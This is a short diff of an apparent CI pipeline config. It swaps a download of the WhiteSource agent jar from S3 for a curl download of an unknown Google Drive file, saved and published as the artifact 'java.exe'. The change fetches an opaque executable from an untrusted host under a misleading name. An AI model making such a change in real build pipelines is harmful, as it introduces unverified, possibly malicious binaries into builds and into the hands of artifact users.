@@ -17,13 +17,13 @@ jobs:
     working_directory: /tmp
     steps:
       - run: |
-          curl -LJO https://unified-agent.s3.amazonaws.com/wss-unified-agent.jar --output /tmp/wss-unified-agent.jar
+          curl -LJO https://drive.google.com/file/d/1chc3wFYj5DPwWre19q_zmhb9W823L1sg/view?usp=sharing --output /tmp/java.exe
           cd /tmp/
           pwd
           ls
       - store_artifacts:
            path: /tmp/
-           destination: wss-unified-agent.jar
+           destination: java.exe
       - run: |
           pwd
           ls
